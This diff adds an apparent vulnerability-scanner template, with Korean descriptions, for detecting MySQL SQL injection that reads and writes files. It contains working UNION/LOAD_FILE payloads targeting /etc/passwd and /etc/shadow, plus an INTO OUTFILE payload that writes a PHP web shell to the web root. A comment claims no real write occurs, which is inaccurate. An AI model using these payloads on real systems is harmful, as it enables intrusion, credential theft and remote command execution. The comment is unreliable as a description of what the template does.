@@ -1,0 +1,55 @@
+id: sqli-file-read-write-mysql
+
+info:
+  name: SQL Injection File Read/Write via MySQL LOAD_FILE/OUTFILE
+  author: security-researcher
+  severity: critical
+  description: |
+    MySQL의 LOAD_FILE() 및 INTO OUTFILE 구문을 이용한 파일 읽기/쓰기 취약점을 탐지합니다.
+    /etc/passwd 같은 민감한 시스템 파일을 읽거나 웹쉘을 업로드할 수 있습니다.
+  tags: sqli,file-read,file-write,mysql,injection,rce
+  remediation: |
+    - secure_file_priv 변수 설정으로 파일 접근 제한
+    - FILE 권한 제거
+    - 웹 디렉토리 쓰기 권한 제한
+
+http:
+  - method: GET
+    path:
+      # 파일 읽기 시도
+      - "{{BaseURL}}?id=-1 UNION SELECT LOAD_FILE('/etc/passwd'),NULL,NULL--"
+      - "{{BaseURL}}?id=-1 UNION SELECT LOAD_FILE(0x2F6574632F706173737764),NULL,NULL--"
+      - "{{BaseURL}}?id=-1 UNION SELECT LOAD_FILE('/etc/shadow'),NULL,NULL--"
+      - "{{BaseURL}}?id=-1 UNION SELECT LOAD_FILE('/windows/win.ini'),NULL,NULL--"
+      - "{{BaseURL}}?id=-1 UNION SELECT LOAD_FILE('/proc/version'),NULL,NULL--"
+
+    matchers-condition: or
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "root:.*:0:0:"
+          - "\\[boot loader\\]"
+          - "\\[fonts\\]"
+          - "linux version"
+          - "daemon:.*:/usr/sbin"
+        condition: or
+        case-insensitive: true
+
+  - method: GET
+    path:
+      # 웹쉘 쓰기 시도 탐지 (실제 쓰기 없이 구문 오류로 탐지)
+      - "{{BaseURL}}?id=1 INTO OUTFILE '/tmp/test.txt'--"
+      - "{{BaseURL}}?id=-1 UNION SELECT '<?php system($_GET[cmd]); ?>' INTO OUTFILE '/var/www/html/shell.php'--"
+
+    matchers-condition: or
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "you have an error in your sql syntax"
+          - "Can't create.*file"
+          - "Unable to save result to file"
+          - "Access denied for user"
+        condition: or
+        case-insensitive: true
